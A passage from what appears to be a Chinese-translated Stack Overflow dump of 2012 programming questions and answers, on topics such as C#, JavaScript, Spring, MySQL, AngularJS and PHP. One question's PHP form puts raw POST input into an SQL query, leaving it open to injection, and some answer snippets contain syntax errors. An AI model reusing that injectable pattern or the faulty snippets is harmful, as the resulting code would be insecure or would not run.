
您可以有一个方法，该方法返回`Shape`在基类 Shape 上定义的实例：

```
public abstract class Shape
{
    public Shape Mutate(int numberOfSides)
    {
        // over simplified example:
        if(numberOfSides == 3)
           return new Triangle();
    }
}

public class Triangle : Shape {}
public class Square : Shape {} 
```

用法

```
var squ = new Square();
var triangle = squ.Mutate(3); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:18:37.700

现在，你不能。类型严格遵守其实例内容。

在`C++`您可以通过整数值参数化泛型类型。

一般来说，如果你想在运行时改变一些东西，你不应该让它属于一个类型。所以，不要让`SideCount`可写。如果他想要此属性的另一个值，让用户创建新实例。

# c# - 如何使用 C# 提取字符串

> ID：13916702
> 
> 赞同：-7
> 
> 时间：2012-12-17T15:10:10.957
> 
> 标签：c#, text-extraction

我需要从下面给出的文本中提取以粗体显示的密码值 (Password10)。我正在使用 c# 编程语言。

> FName Lname，您的系统密码已更改。如果您没有更改或不知道更改原因，请立即联系管理员。您的新密码是**Password10**
> 
> 如果您有任何问题，请联系：
> 
> 解决方案计划办公室电话：电子邮件：notifications@cho.com
> 
> 感谢您使用 xxxxx

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:14:45.430

好吧，如果您确定这将是文本呈现的形式。总是。然后，您可以简单地执行以下操作：

```
string text = //load your text here;
int startingIndex = text.IndexOf("Your new password is ") + "Your new password is ".Length;
string newText = text.SubString(startingIndex, text.length); //this will load all your text after the password.
//then load the first word
string password = newText.Split(' ')[0]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:21:13.420

你可以使用`string.Substring`：

```
int indexOfPasswordText = text.IndexOf("Your new password is ");
if (indexOfPasswordText != -1)
{
    int passwordStart = indexOfPasswordText + "Your new password is ".Length;
    int indexeOfNextWord = text.IndexOfAny(new[] { '\n', '\r', ' ' }, passwordStart);
    if (indexeOfNextWord == -1) indexeOfNextWord = text.Length;
    string passWord = text.Substring(passwordStart, indexeOfNextWord - passwordStart);
    Console.Write(passWord);
} 
```

[**演示**](http://ideone.com/TYk2ST)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:15:39.483

您也可以考虑使用 RegEx（正则表达式）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T15:39:26.003

我没有对此进行测试，但也许它可以将您推向正确的方向。

```
string input = [YOUR MAIL];
string regex = @"Your new password is (\w+)";
Match m = Regex.Match(input, regex);
if (m.Success) {
    string password= m.Groups[1].Value;
    //do something
} 
```

# javascript - 将字符串转换为函数

> ID：13916709
> 
> 赞同：0
> 
> 时间：2012-12-17T15:10:22.343
> 
> 标签：javascript

总新手问题。我如何让以下代码工作。

```
var f_str = "function test(msg) { alert(msg) }"
var f = eval(f_str)
f("hello") 
```

这个想法是将函数测试作为字符串，并能够将其作为函数执行。eval 似乎不起作用，我也尝试过 JSON.parse，但没有运气..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:13:08.627

在 周围添加括号`f_str`，以便将其解释为函数表达式。

```
var f_str = "(function test(msg) { alert(msg) })";
var f = eval(f_str);
f("hello"); 
```

在您当前的代码中，代码被解释为函数声明。您可以通过打印 / 使用 的值来`test`查看：

```
var f_str = "function test(msg) { alert(msg) }";
var f = eval(f_str);//^^^^
test("hello");   // <-- 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:21:13.737

这通常是个坏主意。如果要执行动态 JavaScript，可以使用如下代码段：

```
 (function() {
    var code = document.createElement('script');
    code.type = 'text/javascript';
    code.async = true;
    code.src = '/path/to/script';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(code, s);
  }()); 
```

或使用`jQuery.getScript()`：

```
$.getScript('/path/to/script'); 
```

# java - Spring @Value 注解不起作用，返回 null

> ID：13916711
> 
> 赞同：2
> 
> 时间：2012-12-17T15:10:28.107
> 
> 标签：java, spring, annotations, mule

我有以下课程：

```
@Component
public class MyClass {

@Value("${main.url}") private String mainUrl; 
```

以下 XML 上下文：

```
<context:annotation-config/>
  <context:component-scan base-package="mypackage"/>

  <context:property-placeholder file-encoding="UTF-8" location="classpath:/app.properties" ignore-unresolvable="true"/> 
```

和道具文件：

```
main.url=veryniceurl.com 
```

注入不起作用，它始终为空。我读了很多类似的例子，我认为一切都很好，但事实并非如此。如果我忘记了什么，谁能告诉我？我正在使用 Mule ESB。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T15:25:58.457

[@Value 似乎不适用于 Mule](https://stackoverflow.com/a/12493421/664054)。相反，您需要通过 Mule XML 将其连接起来，我假设您将组件作为 Spring Bean 加载：

```
<spring:bean id="MyClass" class="com.example.MyClass">
   <spring:property name="mainUrl" value="${main.url}"/>
</spring:bean> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:18:56.857

为您的属性提供一个 id 并使用以下语法：

```
@Value("#{jetProperties['jetBean.name']}")

<!-- define the properties file to use -->
<util:properties id="jetProperties" location="classpath:/jet.properties" /> 
```

来自[http://chrislovecnm.com/2010/03/08/spring-3-java-based-configuration-with-value/](http://chrislovecnm.com/2010/03/08/spring-3-java-based-configuration-with-value/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:21:44.683

您是否在 dispatcher-servlet.xml 中添加了上下文占位符？根据这里，[@Controller 类中的 Spring @Value 注释没有评估属性文件中的值，](https://stackoverflow.com/questions/11890544/spring-value-annotation-in-controller-class-not-evaluating-to-value-inside-pro)他们似乎已经通过在其中添加它而不是应用程序上下文来解决它

# php - 失败的 SQL 案例语句可以更改某些行而不更改其他行吗？

> ID：13916715
> 
> 赞同：0
> 
> 时间：2012-12-17T15:10:36.310
> 
> 标签：php, sql

我打算使用 PHP 来执行 SQL 案例语句来一次编辑 MySQL 表中的许多行。如果查询失败，是否有可能某些值已更改而其他值未更改？

此示例显示了所涉及的 case 语句类型：

```
UPDATE person
    SET name = CASE id
        WHEN 1 THEN 'Jim'
        WHEN 2 THEN 'Mike'
        WHEN 3 THEN 'Precious'
    END,
    sex = CASE id
        WHEN 1 THEN 'female'
        WHEN 2 THEN 'male'
        WHEN 3 THEN 'male'
    END
WHERE id IN (1,2,3) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:17:06.113

交易是您要查找的词。事务是全有或全无的操作。这意味着要么一切都通过并且事务完成，或者某些事情失败并且整个事务被回滚。这样可以防止数据不一致。

如上所述，您的表引擎需要支持事务。InnoDB 在 MySQL 中这样做，而 MyISAM 没有。

# javascript - 我们可以控制关 于 URL 的网页吗？

> ID：13916717
> 
> 赞同：0
> 
> 时间：2012-12-17T15:10:56.407
> 
> 标签：javascript, jquery, html, css, url

我想在不同的 url 中显示/隐藏 div。Div 的显示/隐藏基于 URL。

```
<div class="top">Top</div>
<div class="bottom">Bottom</div> 
```

如果 www.alldiv.com 两个 div 都应该可见，否则如果 www.bottdiv.com “top div”应该隐藏。

有人可以建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:13:14.200

使用[主机名](https://developer.mozilla.org/en-US/docs/DOM/window.location)你可以做

**jQuery**

```
$(function() {
  var host = location.hostname;
  $(".top").toggle(host.indexOf("alldiv")!=-1); // only show on alldiv
}); 
```

**纯JS**

```
window.onload=function() {
  var host = location.hostname;
  var topDiv = document.getElementsByClassName("top");
  topDiv.style.display=host.indexOf("alldiv")!=-1)?"block":"none";
} 
```

也就是说，如果你想隐藏它，你真的不应该将它发送给客户端，除非你想稍后显示它

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-17T15:16:30.640

```
$(function () {
  if(location.hostname == "www.alldiv.com") return;
  else if(location.hostname == "www.bottdiv.com") $(".top").hide();
}) 
```

只要您首先导入 jQuery，这应该可以解决问题。

# java - 如何从嵌入式 glassfish 分散档案中排除罐子？

> ID：13916722
> 
> 赞同：3
> 
> 时间：2012-12-17T15:11:13.757
> 
> 标签：java, jakarta-ee, glassfish, ejb, glassfish-embedded

我们想为我们的桌面应用程序的服务器部分 (EJB 3.1) 使用嵌入式 glassfish。

在使用我们分散的存档启动 glassfish 服务器时，我们经历了较长的启动时间和较高的内存使用率。我们认为会发生这种情况，因为所有第三方 jar 库都会搜索服务注释和/或添加到分散的存档中。

是否可以排除第三方库？

# php - 在 Netbeans PHP 中定义变量类型

> ID：13916725
> 
> 赞同：7
> 
> 时间：2012-12-17T15:11:33.583
> 
> 标签：php, netbeans

我找到了一种以这种方式说 netbeans 变量类型的方法：

```
/* @var $variablename Type */ 
```

但是在这种情况下没有提示（数据库是我的类）：

```
 //model.php
 abstract class Model {
      /* @var $db Database */
      protected $db;
      (...)
 }

 //Mymodel.php
 class MyModel extends Model {
      (...)
       $this->db-> //no hints
      (...)
 } 
```

是Netbeans限制还是我的错误？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-17T15:50:42.487

NetBeans 可以使用两种相似但不同的注释注释：

1.  好的旧[phpdoc](http://manual.phpdoc.org/HTMLSmartyConverter/HandS/phpDocumentor/tutorial_tags.var.pkg.html)块注释，以项目定义开头`/**`并放在项目*定义*之前：

    ```
    /**
     * @var Database $db Database connection instance
     */
    protected $db; 
    ```

2.  [变量类型的内联注释，以](https://blogs.oracle.com/netbeansphp/defining-a-variable-type-in-comment-ii)*use*开头`/*`并放置在 item 之前的某处：

     *```
    $foo = $this->db;
    /* @var $foo Database*/
    $foo->... 
    ```* 

 *当 docblock 注释不可用或没有帮助时，第二种类型会派上用场，例如，您正在使用未记录的第三方库或无法自动跟踪您的变量类型。

您基本上是在 #1 的上下文中使用 #2 的语法；-)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-17T15:30:53.313

首先，先定义变量类型，像这样：

```
/* @var Database $db This is my Database object */ 
```

其次，我建议使用 phpdoc 注释，例如：

```
class Model {

/**
 * @var Database $db This is my Database object
 */
protected $db; 
```

那么应该没有问题...*

# angularjs - 将 $index 与 AngularJS 'ng-options' 指令一起使用？

> ID：13916726
> 
> 赞同：61
> 
> 时间：2012-12-17T15:11:45.200
> 
> 标签：angularjs, html-select

假设我`select`使用以下方法将数组绑定到标签：

```
<select ng-model="selData" ng-options="$index as d.name for d in data"> 
```

在这种情况下，关联的`option`标签被分配一个索引值序列：(0, 1, 2, ...)。但是，当我从下拉列表中选择某些内容时， 的值`selData`将绑定到`undefined`. 绑定真的应该起作用吗？

另一方面，假设我改为执行以下操作：

```
<select ng-model="selData" ng-options="d as d.name for d in data"> 
```

在这里，`option`标签获得相同的索引，但整个对象绑定在更改上。它是通过设计以这种方式工作的，还是这种行为只是 AngularJS 的一个很好的错误或副作用？

* * *

## 回答 #1

> 赞同：204
> 
> 时间：2014-02-27T20:55:52.993

由于数组与 JavaScript 中的对象非常相似，因此您可以使用“对象数据源”的语法。诀窍在部分的**括号**中`ng-options`：

```
var choices = [
  'One',
  'Two',
  'Three'
]; 
```

在模板中：

```
<select
  ng-model="model.choice"
  ng-options="idx as choice for (idx, choice) in choices">
</select> 
```

最后，`model.choice`将有值 0、1 或 2。当它为 0 时，您将看到`One`; 1 将显示`Two`等。但在模型中，您只会看到索引值。

我从 PACKT Publishing 的“使用 AngularJS 掌握 Web 应用程序开发”中改编了这些信息，并在[Angular 参考文档中验证了 select](http://docs.angularjs.org/api/ng/directive/select)。

* * *

## 回答 #2

> 赞同：45
> 
> 时间：2013-10-09T13:12:05.770

既然不能用`$index`，可以试试`indexOf`。

**HTML**

```
<div ng-app ng-controller="MyCtrl">
    <select 
          ng-model="selectedItem"
          ng-options="values.indexOf(selectedItem) as selectedItem for selectedItem in values"></select>
    selectedItem: {{selectedItem}}
</div> 
```

**控制器**

```
function MyCtrl($scope) {
    $scope.values = ["Value1","Value2"];
    $scope.selectedItem = 0;
} 
```

演示`[Fiddle](http://jsfiddle.net/EyBVN/30/)`

*评论：*

`Array.prototype.indexOf`在 IE7 (8) 中不支持

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2012-12-17T15:47:17.180

$index 是为 ng-repeat 定义的，而不是 select。我认为这解释了`undefined`. （所以，不，这不应该工作。）

Angular 支持对整个对象进行绑定。该文档的措辞可以更好地表明这一点，但它确实暗示了这一点：“当您希望将选择模型绑定到非字符串值时，应该使用 ngOptions ... 而不是 ngRepeat。”

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-07-19T21:08:20.037

您也可以在`<option>`标签中使用 ng-value='$index'。

```
<select ng-model="selData">
 <option ng-repeat="d in data track by $index" ng-value="$index">
   {{d.name}}
 </option>
</select> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-05-30T06:42:35.813

不要`$index`在选择标签内使用。`$index`如果要将数组索引用作值或选项，请在选项标签内使用。

```
<option ng-repeat="user in users" value="{{user.username}}">{{$index+1}}</option> 
```

如果您想使用内部值，只需将其作为绑定表达式放入 value 属性中

```
<option ng-repeat="user in users" value="{{$index+1}}">{{user.username}}</option> 
```

我的控制器代码如下：

```
var users = ['username':'bairavan', 'username':'testuser']; 
```

# android - Android和具体的吧

> ID：13916730
> 
> 赞同：0
> 
> 时间：2012-12-17T15:11:55.357
> 
> 标签：android, android-layout

我想实现类似的东西。我在第一个活动，然后我去下一个活动。从第二个活动开始，我深入并开始第三个活动等。我想在这张图片上实现类似条形的东西 第一个活动我只有黑色图形，第二个活动我有黑色和红色图形，第三个活动我有所有三个图形。我怎么能做到这一点。是否有任何默认工具？： ![在此处输入图像描述](../Images/fd001714eb90680c663fd22b1aff3952.png)

# windows - gdi 函数崩溃

> ID：13916734
> 
> 赞同：0
> 
> 时间：2012-12-17T15:12:13.703
> 
> 标签：windows, gdi

我从 gdi 函数中得到奇怪的访问冲突。我的应用程序就像一个图形引擎，多个线程会请求绘制不同的图形对象。单个线程会将所有图形对象绘制到内存 DC。这些线程之间的同步是正确的。

当我准备 userdump 时，两个线程发生了访问冲突。下面是两个线程的调用栈，GetTextExtentPoint32 和 CreateFontIndirect 都崩溃了。

```
// Access violation from Draw Request thread.
ntdll!KiUserExceptionDispatcher+0xe
ntdll!RtlRaiseStatus+0x26
ntdll!RtlpUnWaitCriticalSection+0x3b
ntdll!RtlLeaveCriticalSection+0x1d
gdi32!GdiRealizationInfo+0x88
lpk!FontHasWesternScript+0x1e
lpk!LpkUseGDIWidthCache+0x89
gdi32!GetTextExtentPointWInternal+0x100
gdi32!GetTextExtentPoint32W+0x18

// Access violation from Drawing thread.
ntdll!KiUserExceptionDispatcher+0xe
ntdll!RtlRaiseStatus+0x26
ntdll!RtlpWaitForCriticalSection+0x204
ntdll!RtlEnterCriticalSection+0x46
gdi32!CreateFontIndirectExW+0x26
gdi32!CreateFontIndirectW+0x61 
```

GetTextExtentPoint32 和 CreateFontIndirect 崩溃的可能原因是什么。我从来没有在应用程序中遇到过两次访问冲突。它是怎么发生的？这个应用程序几乎是稳定的，我从来没有从这些点得到访问冲突。我试图调用 CreateFontIndirect( NULL ) 来获取访问冲突，但它没有崩溃..请帮我找到原因..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T17:50:40.533

您有两个不同的线程同时处理 GDI 调用。如果这些调用涉及相同的设备上下文或 GDI 对象，那么您的线程同步中有一个错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T20:04:53.327

您很可能[意外关闭了两次句柄，或者损坏了关键部分](http://blogs.msdn.com/b/oldnewthing/archive/2006/12/11/1259599.aspx)。

# java - 如何在 android 对话框中显示用户输入的 EditText 值

> ID：13916744
> 
> 赞同：1
> 
> 时间：2012-12-17T15:12:39.807
> 
> 标签：java, android

我修改后的工作示例基本上在下面我有 2 个编辑框我希望两者的值都显示在警报框中，其余代码工作正常，警报框确实显示但没有输入的值。

```
public class Main extends Activity {

    EditText username = null;
    EditText password = null;
    Button login;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        EditText usern = (EditText) findViewById(R.id.username);
        EditText pass = (EditText) findViewById(R.id.password);
        Button login = (Button) findViewById(R.id.login);
        String usernm = usern.getText().toString();
        String passnm = pass.getText().toString();
        final Builder alert = new AlertDialog.Builder(this)
            .setTitle("SHOW FIELDS")
            .setMessage("USERNAME:" + usernm + "  PASSWORD:" + passnm)
            .setNegativeButton("CLOSE", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) { 
                    // do nothing
                    closeContextMenu();
                }
             });
         login.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 alert.show();
             }
         }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:16:27.207

您将需要在按钮上获取 EditText 的值，因此在 AlertDialog 中显示为：

```
login.setOnClickListener(new View.OnClickListener() {
         @Override
         public void onClick(View v) {
          usernm = usern.getText().toString();
          passnm = pass.getText().toString();
             alert.show();
         } 
```

`usernm`并`passnm`在类级别声明

**编辑：** 或者最好的方法是创建一个显示警报的方法并在按钮点击时调用它：

```
 public void showalert(){
          usernm = usern.getText().toString();
          passnm = pass.getText().toString();
          alert = new AlertDialog.Builder(Main.this)
            .setTitle("SHOW FIELDS")
            .setMessage("USERNAME:" + usernm + "  PASSWORD:" + passnm)
            .setNegativeButton("CLOSE", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) { 
                    // do nothing
                    closeContextMenu();
                }
             });
     alert.show();
    } 
```

并在按钮单击时调用此方法：

```
 login.setOnClickListener(new View.OnClickListener() {
     @Override
     public void onClick(View v) {
        showalert();
     }:
 }); 
```

并在类级别声明所有变量，您可以通过这些变量在整个类中访问它：

```
public class Main extends Activity {
EditText usern ;
EditText pass ;
Button login;

String usernm ,passnm; //<<< Declare here
Builder alert;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
     usern = (EditText) findViewById(R.id.username);
     pass = (EditText) findViewById(R.id.password);
     login = (Button) findViewById(R.id.login);

         login.setOnClickListener(new View.OnClickListener() {
         @Override
         public void onClick(View v) {
              showalert();
         }
     });
 } 
```

# mysql - 将 MySQL 数据库时区设置为 GMT

> ID：13916747
> 
> 赞同：14
> 
> 时间：2012-12-17T15:12:50.297
> 
> 标签：mysql, database, timezone

我需要更改单个数据库的时区，这可能吗？

我知道我们可以在 WHM 中更改时区（我们使用 hostgator 的专用服务器），但是在服务器上运行的大量遗留软件中有很多 +6 小时的编码（即服务器时区是 CST，我们想要 GMT 的时间，所以以前的开发人员在代码中手动更改了日期/时间 - 糟糕！）。

我现在正在开发一个新软件，并希望在 GMT 中使用它，我知道我可以使用 date_default_timezone_set('GMT') 但这不会解决 MySQL 插入的问题，其中 datetime 列设置为 CURRENT_TIMESTAMP，因为它将插入 @ CST时区。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-12-17T17:18:58.430

不，不能更改 MySQL 实例中单个数据库的时区。

我们可以通过`time_zone`查询检索服务器和客户端设置，如下所示：

```
SELECT @@global.time_zone, @@session.time_zone; 
```

我们还可以更改会话的客户端时区，或更改整个 MySQL 实例的时区。

但是我们需要敏锐地意识到这种变化将对现有客户端连接产生的影响，以及已经存储在实例中的方式`DATETIME`和值将被解释。`TIMESTAMP`

要在 MySQL 实例启动时设置服务器 time_zone，我们可以`/etc/my.cnf`在以下部分修改文件（或从任何地方读取 mysql 实例初始化参数）`[mysqld]`：

```
[mysqld]
default-time-zone='+00:00' 
```

- 或者 -

也可以（不太理想）将`--default_time_zone='+00:00'`选项添加到 mysqld_safe

**注意：**更改 MySQL 服务器上的时区设置不会更改存储在现有 DATETIME 或 TIMESTAMP 列中的值，但由于它确实有效地更改了解释这些存储值的上下文，因此看起来所有值都已移动。（其中 08:00 表示美国中部标准时间上午 8 点，服务器的 time_zone 从 CST 更改为 GMT，同样的“08:00”现在将被视为格林尼治标准时间上午 8 点，这实际上是美国中部标准时间凌晨 2 点。

另请记住，TIMESTAMP 列始终以 UTC 存储，而 DATETIME 列没有时区。 [http://dev.mysql.com/doc/refman/5.5/en/datetime.html](http://dev.mysql.com/doc/refman/5.5/en/datetime.html)

每个客户端会话都可以更改自己会话的时区设置：

```
SET time_zone='-06:00'; 
```

* * *

但这并没有真正“解决”时区转换问题，它只是移动了转换问题。

应用层处理时区转换本身并没有什么“坏处”；有时，这是最好的处理方式。它只需要正确且一致地完成。

（您描述的设置的奇怪之处在于该应用程序存储 DATETIME 值，就好像 MySQL 服务器 time_zone 设置为 GMT，但 MySQL 服务器 time_zone 设置为其他值一样。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-09T14:47:13.643

如果您无法更改当前时区，则可以更改结果。

日期 2015-01-05 12:06:16

```
Select date + Interval 2 Hour 'date' From ExampleTable 
```

日期 2015-01-05 14:06:16

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-06-29T03:53:10.617

You can modify the the default value instead of entering current_timestamp make it insert current_timestamp added to hours offset of your timezone. I just did it this way when didn't found any solution, had to invent my own.

# c# - 从 C# 运行可执行的 fortran 代码并传递参数以运行 .exe

> ID：13916748
> 
> 赞同：0
> 
> 时间：2012-12-17T15:12:55.963
> 
> 标签：c#, fortran

我有一个运行和工作正常的 FORTRAN .exe 文件，它会要求用户输入 1 或 2，如果输入 1，它将进行一些计算，如果输入 2，它会进行不同类型的计算。

我需要从 C# 代码中调用它。我知道如何从 C# 运行 .exe 文件，但我无法将 1 或 2 传递给 .exe 我使用了不同的方法但没有运气。

```
static void Main(string [] args)
        {
           string FileName = @"C:\......sco.exe";

           process.StartInfo = new ProcessStartInfo(FileName,"3");
           Process.Start(process.StartInfo); } 
```

如果有人知道如何解决这个问题，我真的很感激。我是 C# 新手，我无法重写 Fortran 代码，因为它太复杂了。

感谢您阅读这篇文章

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T20:52:25.950

我不懂 C#，所以我不能详细告诉你如何做到这一点，但是当从命令行运行一个 fortran 程序时，你可以提供一个带参数的额外文件。像这样称呼它：`mypgrogram.exe<inputs.ans`

在您的情况下，`inputs.ans`将包含一个`1`or `2`。您可以将程序要求的每个附加参数放在此文件的新行中。

# php - 当字段包含'字符时保存到 MySQL 时出错

> ID：13916756
> 
> 赞同：1
> 
> 时间：2012-12-17T15:13:28.603
> 
> 标签：php, mysql, mysqli

我有一个带有 PHP 的表单，可以将变量保存到 MySQL 数据库中。该表单在 VPS 上工作，但在另一个 VPS 上尝试时，当字段包含 ' 字符时尝试写入数据库时​​会出错。因此，当字段包含 ' 字符时，相同的 PHP 代码在 1 个 VPS 上有效，但在另一个 VPS 上无效。

它在这里工作：[http](http://www.zoekmachineoptimalisatie.us/test.php) ://www.zoekmachineoptimalisatie.us/test.php 在这里（它是另一个 VPS）它给出了一个错误：[http ://www.onzebruidsfotograaf.nl/test.php](http://www.onzebruidsfotograaf.nl/test.php)

我的表格：

```
<?php
$hostname = "localhost"; //host name
$dbname   = "xxxxxxxx"; //database name
$username = "xxxxxxxx"; //username you use to login to php my admin
$password = "xxxxxxxx"; //password you use to login
$conn     = new MySQLi($hostname, $username, $password, $dbname);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <title>Untitled Document</title>
</head>
<body>
<?php
if (isset($_POST['Submit'])) { //if the submit button is clicked

    $title  = $_POST['updatetitle'];
    $bookid = 1;
    $update = "UPDATE test SET Title='$title' WHERE BookID = " . $bookid;

    $conn->query($update) or die("Cannot update"); //update or error
}
?>

<?php
$bookid = 1;
$sql    = "SELECT * FROM test WHERE BookID = '" . $bookid . "'";
$result = $conn->query($sql) or die(mysql_error());
$query = getenv(QUERY_STRING);
parse_str($query);
?>

<h2>Update Record <?php echo $bookid;?></h2>

<form action="" method="post">
    <?php

    while ($row = $result->fetch_assoc()) {
        ?>

        <textarea name="updatetitle" cols="100" rows="30"><?php echo $row['Title']; ?></textarea>

        <table border="0" cellspacing="10">

            <tr>
                <td><INPUT TYPE="Submit" VALUE="Update the Record" NAME="Submit"></td>
            </tr>
        </table>
        <?php
    }
    ?>
</form>

<?php
if ($update) { //if the update worked

    echo "<b>Update successful!</b>";

}
?>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:16:27.953

查询中未转义的引号将产生语法错误。与其完全自己构建 SQL，不如通过*Prepared Statement*为 PHP 变量使用 SQL 变量：

```
if (isset($_POST['Submit'])) { //if the submit button is clicked

    $title  = $_POST['updatetitle'];
    $bookid = 1;

    $update = $conn->prepare('UPDATE test SET Title = ? WHERE BookID = ?;');
    $update->bind_param('sd', $title, $bookid);
    $update->execute();
} 
```

您的一台服务器启用了[Magic Quotes](http://php.net/manual/en/security.magicquotes.php)，而另一台则没有。Magic Quotes 现在被认为是不可取的并且已被弃用，它会自动转义输入。您应该关闭 Magic Quotes 并改用参数化查询/准备语句 - 这样就不需要转义任何东西，它可以防止 SQL 注入。

[MySQLi](http://uk1.php.net/manual/en/mysqli.prepare.php)和 PDO API支持参数化查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:15:28.813

因为单引号会破坏查询语句。为了防止它或`SQL Injection`您需要使用`PDO`或`MySQLI`扩展。有关更多信息，请参阅下面的文章

*   [如何防止 PHP 中的 SQL 注入？](https://stackoverflow.com/questions/60174/how-to-prevent-sql-injection)

# c# - 枚举转换为一个字节

> ID：13916759
> 
> 赞同：2
> 
> 时间：2012-12-17T15:13:41.760
> 
> 标签：c#, entity-framework

我正在使用 EntityFramework 并有一个 LinkStatusID 列，它是一个 tinyint，它在 C# 中生成为一个字节。

```
public enum LinkStatus
{
    Added = 0,
    Deleted = 1
} 
```

然而，这给出了：

```
a.LinkStatusID = (byte)Enums.LinkStatus.Deleted; 
```

有没有更优雅的方式来构建它？

LastCoder 的 EDIT2：

```
public enum LinkStatus : byte
{
    Added = 0,
    Deleted = 1
}

    var blah = Enums.LinkStatus.Added;
    var ty = blah.GetType();

    var blah2 = (byte)Enums.LinkStatus.Added;
    var ty2 = blah2.GetType(); 
```

这不起作用（如我所料）但是[这里](https://stackoverflow.com/questions/5625873/unable-to-implicitly-convert-value-from-enum-even-though-the-underlying-type-is)的第一个答案解释了原因。

EDIT3：EF 不是这个 sln 进入数据库的唯一方式，所以我很想在代码中保持 Enums 明确。感谢 EF5 枚举建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:17:49.883

```
public enum LinkStatus : byte 
```

将避免显式转换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:19:42.730

您可能应该使用本机枚举支持，例如上面提到的 SLaks（Tutorial [is here](http://msdn.microsoft.com/en-us/data/hh859576.aspx)）。如果你不想这样做，你可以做一些我在 EF 支持之前找到的东西：

```
public int CountryInt{get;set;}
public Countries Country
        {
            get { return (Countries) this.CountryInt; }
            set { this.CountryInt = (int) value; }
        } 
```

然后，使用它可以让您只设置 Country 变量，并让它作为正确的 int 值自动进入数据库。

# php - 如何阻止人们在网页上竖起大拇指两次

> ID：13916764
> 
> 赞同：0
> 
> 时间：2012-12-17T15:13:59.327
> 
> 标签：php, javascript, html, sql, ajax

我正在制作一个网站，这是一个新闻/博客类型的网站，人们可以在其中对所发表的帖子发表评论。然后登录的用户可以向上或向下发表评论。在我单击拇指时它工作正常，它使用 ajax 将计数添加到数据库并更新数字，它还阻止该人再次单击拇指，但是如果您按 f5 刷新页面，您可以再次单击大拇指。我怎样才能阻止这种情况发生？将此添加到数据库是我正在考虑的一个选项，但该站点需要能够处理大量评论，并且用户可能会对评论做出数千个拇指，因为它执行数据库表的简单操作在之后会很大很短的时间肯定会减慢页面加载速度，因为每次查看带有评论的页面时它都会查询一个非常长的表。

目前我在评论表中保持竖起和向下的拇指数，因此它会查询评论表并显示数字。如果有人竖起大拇指，您是否建议我添加一个包含用户 ID 和评论 ID 的新表，以便我可以查询该表，并且如果有一行用户 ID == 登录用户和评论 ID == 评论不允许？如果是这样，这就是我对如何做的想法，但正如我上面所说，它会导致一个巨大的表格，这肯定会减慢页面的加载速度

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:19:06.500

您不应该将点击存储为简单的计数器，而是存储实际事件

创建一个名为“clicklog”或其他名称的单独表，并添加诸如`userid`, `commentid`,之类的字段`IsThumbsUp`。然后在您的 ajax 页面中，您可以将竖起大拇指添加到此表中（`IsThumbsUp`是一个布尔值。True 表示竖起大拇指，而 false 表示向下表示。

然后而不是使用像`SELECT comment, thumbsUp, thumbsDown`你可以使用的东西

```
SELECT id, comment,
       (SELECT count(commentid) FROM clicklog WHERE commentID=id AND IsThumbsUp=1) AS thumbsUp,
       (SELECT count(commentid) FROM clicklog WHERE commentID=id AND IsThumbsUp=0) AS thumbsDown
FROM comments 
```

此外，在您的 AJAX 页面中，您还可以检查用户之前是否投票过。如果他有，不要允许。甚至更好。当他投票赞成时，他可以将其更改为投票反对（将 IsThumbsUp 从 1 更改为 0）或反之亦然。

只要确保每个用户只有一个与commentid 和userid 的连接。

还要确保在 clicklog 中的字段上放置索引以快速获取信息。我将主键放在`commentid`并`userid`组合，然后将单独的索引放在`commentid`并`IsThumbsUp`组合

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:18:14.070

一种方法是当您加载评论时，如果该用户已经对每个评论进行了投票，则如果该用户已经投票，则禁用大拇指按钮。

# c# - 如何在 C# 中为每个 X 特定字符添加一个字符

> ID：13916770
> 
> 赞同：-5
> 
> 时间：2012-12-17T15:14:15.333
> 
> 标签：c#, string, line

